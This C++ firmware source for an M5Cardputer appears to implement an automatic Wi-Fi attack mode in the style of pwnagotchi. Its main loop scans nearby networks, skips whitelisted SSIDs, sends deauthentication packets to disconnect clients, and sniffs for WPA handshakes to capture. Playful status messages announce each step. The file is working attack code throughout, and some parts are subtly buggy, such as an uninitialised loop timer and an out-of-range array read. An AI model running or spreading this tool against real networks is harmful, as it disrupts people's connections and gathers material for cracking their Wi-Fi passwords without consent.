#include "pwnagothi.h"
#include "WiFi.h"
#include "logger.h"
#include "settings.h"
#include "ArduinoJson.h"
#include "mood.h"
#include "networkKit.h"
#include "EapolSniffer.h"
#include "ui.h"
#include <vector>

String pwnagothiWhitelist[30];
String pwnagothiMacWhitelist[30];
bool pwnagothiModeEnabled;
bool pwnagothiScan = true;
bool nextWiFiCheck = false;

bool pwnagothiBegin(){
    if(initPersonality() == false){
        logMessage("Personality init failed");
        return false;
    }
    if(!(WiFi.mode(WIFI_MODE_STA) && WiFi.scanNetworks(true, true))){
        return false;
    }   
    setMood(1, "(o_o)", "3 seconds for auto mode start... ESC to cancel");
    updateUi(true, false);
    WiFi.disconnect();
    uint32_t start = millis();
    while(millis() - start < 3000){
        M5.update();
        M5Cardputer.update();
        auto status = M5Cardputer.Keyboard.keysState();
        for(auto i : status.word){
            if(i=='`'){
                setMood(1, "(^_^)", "Pwnagothi mode cancelled");
                updateUi(true, false);
                return false;
            }
        }
    }
    WiFi.scanNetworks(true, true);
    logMessage("Pwnagothi auto mode init!");
    parseWhitelist();
    pwnagothiMode = true;
    return true;
}

// maximum entries we'll accept from the JSON whitelist to avoid OOM
static const size_t MAX_WHITELIST = 200; // adjust to taste (30, 100, 200...)

std::vector<String> parseWhitelist() {
    JsonDocument doc;

    DeserializationError err = deserializeJson(doc, whitelist);
    if (err) {
        logMessage(String("Failed to parse whitelist JSON: ") + err.c_str());
        return std::vector<String>(); // empty vector
    }

    JsonArray arr = doc.as<JsonArray>();
    size_t actualSize = arr.size();
    if (actualSize > MAX_WHITELIST) {
        logMessage(String("Whitelist contains ") + String(actualSize)
                   + " entries; truncating to " + String(MAX_WHITELIST));
        actualSize = MAX_WHITELIST;
    }

    std::vector<String> result;
    result.reserve(actualSize); // reduce fragmentation / reallocation

    size_t i = 0;
    for (JsonVariant v : arr) {
        if (i++ >= actualSize) break;
        const char* s = v.as<const char*>();
        if (s) result.emplace_back(String(s));
        else result.emplace_back(String()); // keep index consistent
    }

    return result;
}

void addToWhitelist(const String &valueToAdd) {
    JsonDocument oldDoc;
    DeserializationError err = deserializeJson(oldDoc, whitelist);
    if (err) {
        // treat as empty array if parse fails
        oldDoc.to<JsonArray>();
    }

    JsonArray oldArr = oldDoc.as<JsonArray>();

    // make new doc sized for old + one more (rough estimate)
    JsonDocument newDoc;
    JsonArray newArr = newDoc.to<JsonArray>();

    size_t count = 0;
    for (JsonVariant v : oldArr) {
        if (count++ >= MAX_WHITELIST) break;
        newArr.add(v.as<const char*>());
    }

    if (count < MAX_WHITELIST) {
        newArr.add(valueToAdd.c_str());
    } else {
        logMessage("Whitelist at capacity, not adding: " + valueToAdd);
    }

    String out;
    serializeJson(newDoc, out);
    whitelist = out;
    saveSettings();
}


void parseMacFromWhitelist() {
  WiFi.mode(WIFI_MODE_STA);  // ensure we can scan
  int netCount = WiFi.scanNetworks(false, true);  // block, include hidden

  for (int i = 0; i < 30; i++) {
    if (pwnagothiWhitelist[i].length() == 0) continue;  // skip unused slots

    bool found = false;
    for (int n = 0; n < netCount; n++) {
      if (WiFi.SSID(n) == pwnagothiWhitelist[i]) {
        uint8_t* mac = WiFi.BSSID(n);
        char macStr[18];
        snprintf(macStr, sizeof(macStr),
                 "%02X:%02X:%02X:%02X:%02X:%02X",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        pwnagothiMacWhitelist[i] = String(macStr);
        found = true;
        break;
      }
    }

    if (!found) {
      pwnagothiMacWhitelist[i] = "";  // mark as not found
    }
  }
}

uint8_t wifiCheckInt = 0;

void pwnagothiLoop(){
    if(pwnagothiScan){
        logMessage("(<_>) Scanning..");
        setMood(1, "(<_>)", "Scanning..");
        updateUi(true, false);
        WiFi.scanNetworks();
        if((WiFi.scanComplete()) >= 0){
            wifiCheckInt = 0;
            pwnagothiScan = false;
            logMessage("(*_*) Scan compleated proceding to attack!");
            setMood(1, "(*_*)", "Scan compleated proceding to attack!");
            updateUi(true, false);
            delayWithUI(pwnagotchi.delay_after_wifi_scan);
        }
    }
    else{
        setMood(1, "(z-z)", "waiting...");
        updateUi(true, false);
        delay(pwnagotchi.delay_before_switching_target);

        String attackVector;
        if(!WiFi.SSID(0)){
            logMessage("('_') No networks found. Waiting and retrying");
            updateUi(true, false);
            delayWithUI(pwnagotchi.delay_after_no_networks_found);
            pwnagothiScan = true;
        }
        if(wifiCheckInt < WiFi.scanComplete()){
            logMessage("Vector name filled: " + WiFi.SSID(wifiCheckInt));
        }
        else{
            pwnagothiScan = true;
            return;
        }
        attackVector = WiFi.SSID(wifiCheckInt);
        setMood(1, "(@_@)", "Oh, hello " + attackVector + ", don't hide - I can still see you!!!");
        logMessage("(@_@) " + String("Oh, hello ") + attackVector + ", don't hide - I can still see you!!!");
        updateUi(true, false);
        delayWithUI(pwnagotchi.delay_after_picking_target);
        std::vector<String> whitelistParsed = parseWhitelist();
        for (size_t i = 0; i < whitelistParsed.size(); ++i) {
            logMessage("Whitelist check...");
            if (whitelistParsed[i] == attackVector) {
                // safe -> skip
                setMood(1, "(x_x)", "Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                logMessage("(x_x) Well, " + attackVector + " you are safe. For now... NEXT ONE PLEASE!!!");
                updateUi(true, false);
                wifiCheckInt++;
                return;
            }
        }
        setMood(1, "(Y_Y)" , "I'm looking inside you " + attackVector + "...");
        updateUi(true, false);
        set_target_channel(attackVector.c_str());
        uint8_t i = 0;
        uint8_t currentCount = SnifferGetClientCount();
        setMac(WiFi.BSSID(wifiCheckInt));
        uint16_t targetChanel;
        uint8_t result = set_target_channel(attackVector.c_str());
        if (result != 0) { //if wifi is not found, enviroment had changed, so rescan to avoid kernel panic
            targetChanel = result;
        } else {
            pwnagothiScan = false;
            return;
        }
        initClientSniffing();
        String clients[50];
        int clientLen;
        unsigned long startTime = millis();
        logMessage("Waiting for clients to connect to " + attackVector);
        while(true){
            get_clients_list(clients, clientLen);
            if (millis() - startTime > pwnagotchi.client_discovery_timeout) {
                setMood(1, "(~_~)", "Attack failed: Timeout waiting for client.");
                logMessage("(~_~) Attack failed: Timeout waiting for client.");
                SnifferEnd();
                updateUi(true, false);
                delay(pwnagotchi.delay_after_no_clients_found);
                wifiCheckInt++;
                return;
            }
            if(!clients[i].isEmpty()){
                logMessage("Client count: " + String(clientLen));
                setMood(1, "(d_b)", "I think that " + clients[i] + " doesn't need an internet..." );
                logMessage("WiFi BSSIS is: " + WiFi.BSSIDstr(wifiCheckInt));
                logMessage("Client BSSID is: "+ clients[clientLen]);
                logMessage("(d_b) I think that " + clients[i] + "doesn't need an internet...");
                updateUi(true, false);
                delay(pwnagotchi.delay_after_client_found);
                stopClientSniffing();
                break;
            }
            updateUi(true, false);
        }
        setMood(1, "(O_o)", "Well, well, well  " + clients[i] + " you're OUT!!!" );
        logMessage("(O_o) Well, well, well  " + clients[i] + " you're OUT!!!");
        updateUi(true, false);
        setTargetAP(WiFi.BSSID(wifiCheckInt));
        if(pwnagotchi.activate_sniffer_on_deauth){
            SnifferBegin(targetChanel);
        }
        if(send_deauth_packets(clients[i], pwnagotchi.deauth_packets_sent, pwnagotchi.deauth_packet_delay) && (pwnagotchi.deauth_on)){
            logMessage("Deauth succesful, proceeding to sniff...");
        }
        else{
            logMessage("Unknown error with deauth or deauth disabled!");
            if(!pwnagotchi.deauth_on){
                logMessage("Deauth disabled in settings, proceeding to sniff...");
            }
            else{
                return;
            }
        }
        setMood(1, "(@--@)", "Sniff, sniff... Looking for handshake..." );
        logMessage("(@--@) Sniff, sniff... Looking for handshake...");
        updateUi(true, false);
        unsigned long startTime1 = millis();
        if(!pwnagotchi.activate_sniffer_on_deauth){
            SnifferBegin(targetChanel);
        }
        while(true){
            SnifferLoop();
            updateUi(true, false);
            delay(10);
            if (SnifferGetClientCount() > 0) {
                while (SnifferPendingPackets() > 0) {
                    SnifferLoop();
                    updateUi(true, false);
                }
                setMood(1, "(^_^)", "Got new handshake!!!" );
                logMessage("(^_^) Got new handshake!!!");
                lastPwnedAP = attackVector;
                updateUi(true, false);
                SnifferEnd();
                pwned_ap++;
                sessionCaptures++;
                wifiCheckInt++;
                if(pwnagotchi.sound_on_events){
                    Sound(1500, 100, true);
                    Sound(2000, 100, true);
                    Sound(2500, 150, true);
                }
                if(pwnagotchi.add_to_whitelist_on_success){
                    logMessage("Adding " + attackVector + " to whitelist");
                    addToWhitelist(attackVector);
                }
                else{
                    logMessage(attackVector + " not added to whitelist");
                }
                saveSettings();
                delay(pwnagotchi.delay_after_successful_attack);
                break;
            }
            if (millis() - startTime1 > pwnagotchi.handshake_wait_time) { // 20 seconds timeout
                setMood(1, "(~_~)", "Attack failed: Timeout waiting for handshake.");
                logMessage("(~_~) Attack failed: Timeout waiting for handshake.");
                SnifferEnd();
                updateUi(true, false);
                
                delay(pwnagotchi.delay_after_attack_fail);
                if(pwnagotchi.add_to_whitelist_on_fail){
                    logMessage("Adding " + attackVector + " to whitelist");
                    addToWhitelist(attackVector);
                    saveSettings();
                }
                wifiCheckInt++;
                if(pwnagotchi.sound_on_events){
                    Sound(800, 150, true);
                    Sound(500, 150, true);
                    Sound(300, 200, true);
                }
                break;
            }
        }
    }
    setMood(1, "(>_<)", "Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
    logMessage("(>_<) Waiting " + String(pwnagotchi.nap_time/1000) + " seconds for next attack...");
    updateUi(true, false);
    delay(pwnagotchi.nap_time);
} 

void delayWithUI(uint16_t delayTime){
    logMessage("Waiting " + String(delayTime) + "ms");
    for(uint16_t timer; timer<=delayTime; timer++){
        M5.update();
        M5Cardputer.update();
        updateUi(true, false);
        delay(1);  // Delay for 1 ms to avoid blocking the UI
    }
}

void removeItemFromWhitelist(String valueToRemove) {
    JsonDocument oldList;
    deserializeJson(oldList, whitelist);
    JsonDocument list;
    JsonArray array = list.to<JsonArray>();
    JsonArray oldArray = oldList.as<JsonArray>();
    
    for (JsonVariant v : oldArray) {
        String item = String(v.as<const char*>());
        if (item != valueToRemove) {
            array.add(item);
        }
    }
    
    String newWhitelist;
    serializeJson(list, newWhitelist);
    whitelist = newWhitelist;
    saveSettings();
}
